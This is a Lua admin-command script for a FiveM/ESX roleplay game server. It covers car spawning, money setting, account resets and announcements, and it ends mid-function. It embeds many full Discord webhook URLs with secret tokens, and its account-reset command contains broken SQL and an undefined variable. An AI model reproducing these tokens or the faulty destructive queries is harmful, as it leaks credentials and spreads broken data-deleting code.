local ESX = nil

local spamduty = {}


local adutylog = "https://discord.com/api/webhooks/1215217819554414612/ujabCvwg1mPuavDuti2rVn4eH4SuB9NWO4Ttu_EmoZduSpLcbPbe0bbdG3eiltL8uXsA"
local nczlogv = "https://discord.com/api/webhooks/1215217904677683211/xVZdajFAMHOryBMQyyaKxqIXg_bo_7zqkoMvsKQQOgcLdeW467KYD3WACbDl4X_uSUdP"
local healalllog = "https://discord.com/api/webhooks/1215218083262636032/Ifwig5EHi7fVdG8f4xY-9I6ThxbaHo3Ycc_v-2HqM-N3ARYyoyHKS_OsvHS74jNnEk6x"
local rewarnlog = "https://discord.com/api/webhooks/1215218185012518952/sRReXUwlVdvd4TLRQIDqpFnGzFd7Zd8ZHePTe--W3Dq7oHN9yiGdbjhSm2oJ2WmU-bY-"
local revivealllog = "https://discord.com/api/webhooks/1215218314255540275/Zb3yMCmp3YpS8Vhi897KygbUMyF6-84NuKEhvV7UATMrs-VAnODUxejDDTsyvuRVrWuH"
local charmenu = "https://discord.com/api/webhooks/1215218476722167809/N6Sfn2VC3QyXlXvj-2zoV44YJN4x5u5mSWQoL7WsP4M7oAgnU0Rg-HHPXd_UsCiuqSBc"
local showperm = "https://discord.com/api/webhooks/1215218655852498945/_nYWEsqvblJlHHRkLwmeMQBMjqV2rB5Tp4dYxV0T92bKDFFbxudewzP1e8F8SP5AjezB"
local bringlog = "https://discord.com/api/webhooks/1215218918495358986/s0pg-an7IrD8bQNXc8WYdkf2E3DR09uAdkZ8vY9Kk8nRcv_64SBRx1npRC_awsNORTXq"
local creategang = "https://discord.com/api/webhooks/1215220104439140362/hW6igfnmYrIcvZBUntMQvQtI_C6QujMO5b_wy0ziQcvMbobYicJrw2i6MxPj0Iim8p7F"
local addcargang = "https://discord.com/api/webhooks/1215220186303569920/LGzfEBCq-wphtXTdEsjgLb5Vci4pmcQzWKpWvg-f-sG5Ceh0NsBJAgYbTxcVZldbgrfE"




TriggerEvent("esx:getSharedObject", function(obj)
    ESX = obj
end)


local aapermmanager = {
	'steam:11000013df4e6ab', --AliReza_At
	'steam:11000014d47ee0b', --Ahmad
	'steam:1100001588589f7', --Ketara
	'steam:110000164842635', --Lightpower
	'steam:11000013a72945f', --Erma
	'steam:11000014248bd86', --Dojen
	'steam:1100001448536f8', --Masih
	'steam:110000160e8006c', --NavidXenon
	'steam:11000015a491f30', --ArmanRJ
	
}

function Dastresiaa(player)
    local allowed = false
    for i,id in ipairs(aapermmanager) do
        for x,pid in ipairs(GetPlayerIdentifiers(player)) do
                if string.lower(pid) == string.lower(id) then
                    allowed = true
                end
            end
        end        
    return allowed
end

---============---
------Add Car-----
---============---


RegisterCommand('changeped', function(source, args)
	if Dastresiaa(source) then
		if args[1] ~= nil then
			if args[2] ~= nil then
				local requestped = tostring(args[2])
				local id = args[1]
				TriggerClientEvent("changePedHandler", id, requestped)
			else
				TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma hich pedi vared nakardid")
			end
		else	
			TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma hich ID vared nakardid")
		end
	else
		TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma AliReza_At Nistid")
	end
end)


--[[
RegisterCommand('addcar',function(source, args, user)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.get('aduty') then

		local newOwner = tonumber(args[1])
		if newOwner then
			local plate = args[2]
			TriggerClientEvent('addDonationCar', source, newOwner, plate)
		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Lotfan Id Sahebe Mashin Ro befrestid!")
		end

	else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

	end
end)
]]

TriggerEvent('es:addAdminCommand', 'addcar', 13, function(source, args, user)
	local xPlayer = ESX.GetPlayerFromId(source)
	local WebHook = "https://discord.com/api/webhooks/1215220327358009354/vDr0W04Je5ueTnKD41g7idYPabf5amHApgObWhG28sol09KDELGIoc1NZ6o21LS9VsrG"
	if Dastresiaa(source) then

		local newOwner = tonumber(args[1])
		if newOwner then
			local plate = args[2]
			TriggerClientEvent('addDonationCar', source, newOwner, plate)
			PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\nAdded :" .. plate .. "\nFor "..GetPlayerName(args[1]).."```" }  ), {['Content-Type'] = 'application/json'})
		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Lotfan Id Sahebe Mashin Ro befrestid!")
		end

	else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma Dastresi nadarid!")

	end

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "add car for player", params = {{name = "PlayerID", help = "Id Playeri ke Online hast"}, {name = "Pelak", help = "Mitonid in bakhsh ro khali bezarid"}}})








---=================---
------Add Car Gang-----
---=================---


RegisterCommand('addcargang', function(source, args)
	if Dastresiaa(source) then
		if args[1] then
			local plate = args[2]
			PerformHttpRequest(addcargang, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\nAdded :" .. plate .. "\nFor Gang : "..args[1].."```" }  ), {['Content-Type'] = 'application/json'})
			TriggerClientEvent('addGangCar', source, args[1], plate)

		end

	else
		TriggerClientEvent('At:msg', source, 'Shoma Perm Kafi Nadarid')
	end

end)

--[[
TriggerEvent('es:addAdminCommand', 'addcargang', 27, function(source, args, user)

	if args[1] then
		local plate = args[2]

		TriggerClientEvent('addGangCar', source, args[1], plate)

    end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "add car for player", params = {{name = "gang", help = "Esm Gang"}, {name = "Pelak", help = "Mitonid in bakhsh ro khali bezarid"}}})
]]



RegisterCommand("resetacc", function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level == 15 then
			if args[1] then
				if args[2] then
					local hex = args[1]
					local type = args[2]
					local reason = table.concat(args, " ", 3)

					MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier',
					{
						['@identifier'] = hex

					}, function(data)
						if data[1] then	
							if type == 'all' then
								MySQL.Async.execute('DELETE FROM addon_account_data WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM addon_inventory_items WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM billing WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM billing WHERE sender = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM datastore_data WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM owned_properties WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM owned_vehicles WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM user_licenses WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM phone_user_contacts WHERE number IN (SELECT phone_number FROM users WHERE @identifier)', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET bank = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET money = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET job = "unemployed" WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET job_grade = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET gang = "nogang" WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET gang_grade = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Account ^1" .. name .. " ^0Ba ^2Movafaghiyat ^0Reset Shod, Dalil: " .. reason)
								TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Account ^2" .. name .. " ^0be dalil ^1" .. reason .. " ^0reset shod!")
							elseif type == 'inventory' then
								MySQL.Async.execute('DELETE FROM addon_account_data WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM addon_inventory_items WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM datastore_data WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Inventory Account ^1" .. name .. " ^0Ba ^2Movafaghiyat ^0Reset Shod, Dalil: " .. reason)
								TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Inventory Account ^2" .. name .. " ^0Be Dalil ^1" .. reason .. " ^0Reset Shod!")
							elseif type == 'vehicles' then
								MySQL.Async.execute('DELETE FROM owned_vehicles WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Vehicles Account ^1" .. name .. " ^0Ba ^2Movafaghiyat ^0Reset Shod, Dalil: " .. reason)
								TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Vehicles Account ^2" .. name .. " ^0Be Dalil ^1" .. reason .. " ^0Reset Shod!")
							elseif type == 'money' then
								MySQL.Async.execute('UPDATE users SET bank = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET money = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Cash&Bank Account ^1" .. name .. " ^0Ba ^2Movafaghiyat ^0Reset Shod, Dalil: " .. reason)
								TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Cash&Money Account ^2" .. name .. " ^0Be Dalil ^1" .. reason .. " ^0Reset Shod!")
							elseif type == 'job' then
								MySQL.Async.execute('UPDATE users SET job = "unemployed" WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET job_grade = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET gang = "nogang" WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET gang_grade = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Job&Gang Account ^1" .. name .. " ^0Ba ^2Movafaghiyat ^0Reset Shod, Dalil: " .. reason)
								TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Job&Gang Account ^2" .. name .. " ^0Be Dalil ^1" .. reason .. " ^0Reset Shod!")
							end				
					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player Mored Nazar Payda Nashod")
					end
				end)
			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Type Reset Account Ra Moshakhas Konid")
			end
		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Hex Player Ra Vared Konid")
		end
	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma Perm Mored Nazar Ra Nadarid")
	end
end, false)



TriggerEvent('es:addAdminCommand', 'mcar', 7, function(source, args, user)
	TriggerClientEvent('es:spawnMaxVehicle', source, args[1], true)
	--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/911006691322134578/O3UFEdsY2yh0bWFu-ffls4XLCUvGrMiYpkpZDjvGTphAt1tpmhfBuA6X2NHstInmQRLJ", "Admin : "..GetPlayerName(Source).. "\nSpawned Vehcile(Mcar) Model -> **"..args[1].."**")
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })
end, {help = _U('spawn_car'), params = {{name = "car", help = _U('spawn_car_param')}}})


TriggerEvent('es:addAdminCommand', 'clearall', 20, function(source, args, user)

	local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.get('aduty') then

			TriggerClientEvent('chat:clear', -1)

		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")
		end

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end)




RegisterCommand('a', function(source, args)

    local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 0 then
		local chatmsg = table.concat(args, " ")
		local playerNamechat = GetPlayerName(source)

		TriggerClientEvent('chat:addMessage', source, {
			template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(104, 300, 400, 0.5); border-radius: 1px;" class="chat-message achat"><b>Admin Chat (<span class="report-style">{0} {1}</span>):</b> {2}</div>',
			args = { playerNamechat, source , chatmsg}
		})

		TriggerEvent("es:getPlayers", function(pl)
			for k,v in pairs(pl) do
				TriggerEvent("es:getPlayerFromId", k, function(user)
					if(user.permission_level > 0 and k ~= source)then
						TriggerClientEvent('chat:addMessage', k, {
							template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(104, 300, 400, 0.5); border-radius: 1px;" class="chat-message achat"><b>Admin Chat (<span class="report-style">Name: {0} ID: {1}</span>):</b> {2}</div>',
							args = { playerNamechat, source , chatmsg}
						})
					end
				end)
			end
		end)
	end

end)


local admins = {}

RegisterCommand('admins', function(source, args, user, data, cb)

	local xPlayer = ESX.GetPlayerFromId(source)
	
    if admins[source] then
        TriggerClientEvent('chat:addMessage', source, {args = {"[SYSTEM] ", "^2Lotfan ^5120^2 Saniye Ta Didan Mojadad List Staff Sabr Knid"}})
        return
    else
		local xPlayers = ESX.GetPlayers()	
		for i=1, #xPlayers, 1 do
			xPlayer = ESX.GetPlayerFromId(xPlayers[i])
			if xPlayer.permission_level >= 1 then
				if xPlayer.get('aduty') and GetPlayerName(xPlayers[i]) ~= nil then
					TriggerClientEvent('chatMessage', source, "[Admins Log]", {255, 0, 0}, "^2Name: ^0" .. GetPlayerName(xPlayers[i]) .. "^2  | Duty : ^0OnDuty")
				else
					if GetPlayerName(xPlayers[i]) ~= nil then
						TriggerClientEvent('chatMessage', source, "[Admins Log]", {255, 0, 0}, "^2Name: ^0" .. GetPlayerName(xPlayers[i]) .. "^2| Duty : ^5OffDuty")
					end
				end
			end
		end
        admins[source] = true
        SetTimeout(120000, function()
            admins[source] = false
        end)
	end
end)



TriggerEvent('es:addAdminCommand', 'setarmor', 8, function(source, args, user)

	if args[1] and args[2] then
		if tonumber(args[1]) then

			local target = tonumber(args[1])

			if tonumber(args[2]) then

				local armor = tonumber(args[2])

				if armor <= 100 then

					if GetPlayerName(target) then

						local targetPlayer = ESX.GetPlayerFromId(target)

						TriggerClientEvent('chat:addMessage', target, "[SYSTEM]", {255, 0, 0}, " ^2" .. GetPlayerName(source) .. " ^0 Armor shomara be ^3" .. armor ..  " ^0Taghir dad!")
						TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, "^0 Shoma be ^2 " .. GetPlayerName(target) .. "^3 " .. armor .. " ^0Armor dadid!")
						TriggerClientEvent('armorHandler', target, armor)
						--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/931278158114742293/5ojymCJmmATIwWbWvzlqAK0uonjiP4Gu6Iu1nmH3ZE41m9ZupLpBmRpI0kBlcw_G0CpJ", "Admin : "..GetPlayerName(Source).. "\nBe : **"..GetPlayerName(target).."**\nArmor **" .. armor .. "**Dad")

					else
						TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")
					end
				else
					TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid meghdar armor ra bishtar az 100 vared konid!")
				end

			else
				TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat Armor faghat mitavanid adad vared konid!")
			end

		else
			TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!")
		end

	else
		TriggerClientEvent('chat:addMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Syntax vared shode eshtebah ast!")
	end
	
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })
end, {help = 'setarmor', params = {{name = "id", help = 'player id'}, {name = "armor", help = 'armor size'}}})





RegisterCommand('setmoney', function(source, args, user)
	local _source = source
	local target = tonumber(args[1])
	local money_type = args[2]
	local money_amount = tonumber(args[3])
	local reason = args[4]
	local xPlayer = ESX.getPlayerFromId(target)
	if Dastresiaa(source) then 
		if target and money_type and money_amount and xPlayer ~= nil and reason ~= nil then
			if money_type == 'cash' then
				xPlayer.setMoney(money_amount)
			elseif money_type == 'bank' then
				xPlayer.setBank(money_amount)
			elseif money_type == 'btf' then 
				xPlayer.setbtf(money_amount)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "^2" .. money_type .. " ^0 is not a valid money type!" } })
				return
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "Invalid arguments." } })
			return
		end

		local moneyArray = {
			{
				["color"] = "02550",
				["title"] = "Admin Set Money",
				["description"] = "ID: **("..source..")**\nPlayer Name: **"..GetPlayerName(source).."**",
				["fields"] = {
					{
						["name"] = "Set Money To:",
						["value"] = "**ID:"..args[1].."\nName:"..xPlayer.name.."**"
					},
					{
						["name"] = "Money Type:",
						["value"] = "**"..money_type.."**"
					},
					{
						["name"] = "Money Amount:",
						["value"] = "**"..money_amount.."**"
					},
					{
						["name"] = "Reason:",
						["value"] = "**"..args[4].."**"
					},
					{
						["name"] = "Time:",
						["value"] = "**"..os.date('%Y-%m-%d %H:%M:%S').."**"
					}
				},
				["footer"] = {
				["text"] = "AliReza System",
				["icon_url"] = "https://cdn.discordapp.com/attachments/723250559565561876/856471773872783390/500x506_1558104453854225.jpg",
				}
			}
		}

		TriggerEvent('DiscordBot:ToDiscord', 'money', SystemName, moneyArray, 'system', source, false, false)
		
		print('Acore: ' .. GetPlayerName(source) .. ' Addedmoney $' .. ESX.Math.GroupDigits(money_amount) .. ' (' .. money_type .. ') to ' .. xPlayer.name)
		
		if xPlayer.source ~= _source then
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('money_set', ESX.Math.GroupDigits(money_amount), money_type))
		end

	else
		TriggerClientEvent('esx:showNotification', source, 'Shoma Dastresi Kafi Nadarid')
	end

end)


--[[
TriggerEvent('es:addAdminCommand', 'setmoney', 29, function(source, args, user)
	local _source = source
	local target = tonumber(args[1])
	local money_type = args[2]
	local money_amount = tonumber(args[3])
	local reason = args[4]
	local xPlayer = ESX.getPlayerFromId(target)

	if target and money_type and money_amount and xPlayer ~= nil and reason ~= nil then
		if money_type == 'cash' then
			xPlayer.setMoney(money_amount)
		elseif money_type == 'bank' then
			xPlayer.setBank(money_amount)
		elseif money_type == 'lc' then 
			xPlayer.setlc(money_amount)
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "^2" .. money_type .. " ^0 is not a valid money type!" } })
			return
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "Invalid arguments." } })
		return
	end

	local moneyArray = {
		{
			["color"] = "02550",
			["title"] = "Admin Set Money",
			["description"] = "ID: **("..source..")**\nPlayer Name: **"..GetPlayerName(source).."**",
			["fields"] = {
				{
					["name"] = "Set Money To:",
					["value"] = "**ID:"..args[1].."\nName:"..xPlayer.name.."**"
				},
				{
					["name"] = "Money Type:",
					["value"] = "**"..money_type.."**"
				},
				{
					["name"] = "Money Amount:",
					["value"] = "**"..money_amount.."**"
				},
				{
					["name"] = "Reason:",
					["value"] = "**"..args[4].."**"
				},
				{
					["name"] = "Time:",
					["value"] = "**"..os.date('%Y-%m-%d %H:%M:%S').."**"
				}
			},
			["footer"] = {
			["text"] = "AliReza System",
			["icon_url"] = "https://cdn.discordapp.com/attachments/723250559565561876/856471773872783390/500x506_1558104453854225.jpg",
			}
		}
	}

	TriggerEvent('DiscordBot:ToDiscord', 'money', SystemName, moneyArray, 'system', source, false, false)
	
	print('es_extended: ' .. GetPlayerName(source) .. ' just set $' .. ESX.Math.GroupDigits(money_amount) .. ' (' .. money_type .. ') to ' .. xPlayer.name)
	
	if xPlayer.source ~= _source then
		TriggerClientEvent('esx:showNotification', xPlayer.source, _U('money_set', ESX.Math.GroupDigits(money_amount), money_type))
	end

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })
end, {help = _U('setmoney'), params = {{name = "id", help = _U('id_param')}, {name = "money type", help = _U('money_type')}, {name = "amount", help = _U('money_amount')}, {name = "reason", help = 'Reason of set moeny'}}})

]]



RegisterCommand('car',function(source,args)
    local xPlayer = ESX.GetPlayerFromId(source)
	local WebHook = "https://discord.com/api/webhooks/1215221026972237825/1JtPcrljr_YZCH_MUYjctxGrt0KAWtH7Z0nMVaFEFRWgIaJCdlkCXU9bOfwv6MfWRCAF"
    local name = args[1]
    local target = args[2]
    if name then
		if xPlayer.get('aduty') then
			if tonumber(xPlayer.permission_level) > 2 and tonumber(xPlayer.permission_level) <= 5 then
				if name == 'bf400' or name == 'neon' or name == 'bmx' then
					TriggerClientEvent('esx:spawnVehicle',source,name)
					PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\n" ..args[1].. "  Spawn Kard```"}), {['Content-Type'] = 'application/json'})
				else
					PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\n" ..args[1].. "  Spawn Kard```"}), {['Content-Type'] = 'application/json'})
					TriggerClientEvent('chatMessage', source, "^1[SYSTEM] : ^2Perm Shoma Tavanai Spawn : ^3Bf400-Neon-Bmx ^2Ra Darad !")
				end
			elseif tonumber(xPlayer.permission_level) > 5 then
				TriggerClientEvent('esx:spawnVehicle',source,name)
			end
		end
    else
        TriggerClientEvent('chatMessage', source, "^1[SYSTEM] : /car Esm Mashin & Motor ...")
    end
end)

RegisterCommand('az', function(source)
	
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level >= 1 then
		if  xPlayer.get('aduty') then
			TriggerClientEvent('esx:teleport', source, {
				x = -419.1,
				y = 1147.09,
				z = 325.86
			})
			SetPlayerRoutingBucket(source, 0)
			--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/931278737440387112/PuQqx_wNGZu7WwAs3YV5idYGVNKayssOL7NFeDYARbX9bJhzLgFC0s4VTdr1pgavHwlI", "Admin : "..GetPlayerName(Source).. "\nBe Admin Zone Raft (/az)")
		end
	end

end)




RegisterCommand('discordjoin', function(source)
	TriggerClientEvent('chatMessage', source, "[Link Disocrd]", {255, 0, 0}, " ^0https://discord.gg/tSrQQf7FAc")
end)





RegisterCommand('changeworld', function(source, args)
    local target = tonumber(args[1])
	--local WebHook = 'https://discoadadrd.com/adadadaapi/webhooks/871270144108818474/g6CwvDE57SxzOt3P8EEtBLlB2KKdHV2kSn-wfT8lH06YBgt6E_bNNq8KXyG2tz3FZUMv'
	local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.permission_level >= 12 then
        if args[1] then 
            if args[2] then
				if args[3] then
					if tonumber(args[2]) >= 0 and tonumber(args[2]) < 64 then
						SetPlayerRoutingBucket(target, tonumber(args[2]))
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma Word^1" .. GetPlayerName(target) .. "^0Ra Be^1" .. args[2] .. "^0Change Dadid .^1[ ^0Dalil :^1 " ..args[3].. " ]")
						--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/931278898761711666/fEpnMuKhIWwn6_t5NcPjKkcYyHuujDUczwlxCFZpoRSYJustCquqvzryNIyyylkP8BLH", " ```  Admin :  "..GetPlayerName(source).. "\n\n Word  :" ..GetPlayerName(target).. "  Ra Change Dad \n\nWord ID:" ..args[2].. " \n\nDalil "  ..args[3].. " ```")
						--TriggerClientEvent('esx:showNotification',target, "Word Shoma Be Word"..args[2].."Chnage Shod")
					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Max Woord 64 Mibashad")
					end
				else
					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoam Dar Ghesmat Dalil Chizi Vared Nakardid")
				end
            else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Word Vared Shdeh Eshtebah Ast")
			end
		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Id Vared Shdeh Eshtebah Ast")
		end

    else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Dastres Kafi  ^0Nadarid!")
	end
		
end)



RegisterCommand('clearallchat', function(source, args, user)

    local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level >= 12 then

		TriggerClientEvent('chat:clear', -1)

	else
		TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })

	end
end)


TriggerEvent('es:addAdminCommand', 'wchat', 1, function(source, args, user)
	if args[1] then
		if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
			local player = tonumber(args[1])

			-- User permission check
			TriggerEvent("es:getPlayerFromId", player, function(target)
				if(target)then
					TriggerClientEvent('chat:addMessage', player, { args = {"^1WChat", "Shoma DM Jadid Darid ^2" .. GetPlayerName(source)..":"..table.concat(args, " ")} })
					TriggerClientEvent('chat:addMessage', source, { args = {"^1Wchat", "Shoma Dm Dadid Be  ^2" .. GetPlayerName(player) .. ":"..table.concat(args, " ")} })
				end
			end)
		else
			TriggerClientEvent('chat:addMessage', source, {template = '<div class="chat-message server"><b>Server :</b> Incorrect player ID</div>'})
		end
	else
		TriggerClientEvent('chat:addMessage', source, {template = '<div class="chat-message server"><b>Server :</b> Incorrect player ID</div>'})
	end 
	
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })
end, {help = "chat to player" , params = {{name = "Player id", help = "id player mord nazar vared konid"}, {name= "Massage", help="Matn payam khodeton vared konid"}}})


--[[
	
TriggerEvent('es:addAdminCommand', 'announce', 7, function(source, args, user)
    local msg = table.concat(args, " ")

	TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(400, 17, 55, 0.4);border-radius: 3px;" class="chat-message server"><b>📢 Server Announce</b> ( {0} ) <b>: {1}</b></div>',
        args = { GetPlayerName(source), msg }
    })
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })
end, {help = "Announce a message to the entire server", params = {{name = "announcement", help = "The message to announce"}}})

]]

RegisterCommand('announce', function(source, args, user)
	if Dastresiaa(source) then
		local msg = table.concat(args, " ")
		TriggerClientEvent('chat:addMessage', -1, {
			template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(400, 17, 55, 0.4);border-radius: 3px;" class="chat-message server"><b>📢 Server Announce</b> ( {0} ) <b>: {1}</b></div>',
			args = { GetPlayerName(source), msg }
		})
	end
end)

TriggerEvent('es:addAdminCommand', 'changeplate', 12, function(source, args, user)

	if args then
		local Plate = table.concat(args, " ")
		TriggerClientEvent('ChangeCarPlate', source, Plate)
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "Lotfan Plake Jadid Mashin Ro Vared Konid!" } })
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "Avaz Kardane Pelake Mashin", params = {{name = "Plate", help = "Pelake Jadid"}}})



TriggerEvent('es:addAdminCommand', 'fine', 5, function(source, args, user)
	if args[1] and args[2] and args[3] then
		target = tonumber(args[1]) 
		if target then
			if GetPlayerName(target) then
				local targetPlayer = ESX.GetPlayerFromId(target)
				money = tonumber(args[2])
				if money then
					-- if targetPlayer.bank >= money then
						local previousmoney = targetPlayer.bank
						local reason = table.concat(args, " ",3)
						
						targetPlayer.removeBank(money)
						TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Shoma az^1 " .. GetPlayerName(target) .. " ^0Mablagh ^2" .. money .. "$ ^0kam kardid!" } })
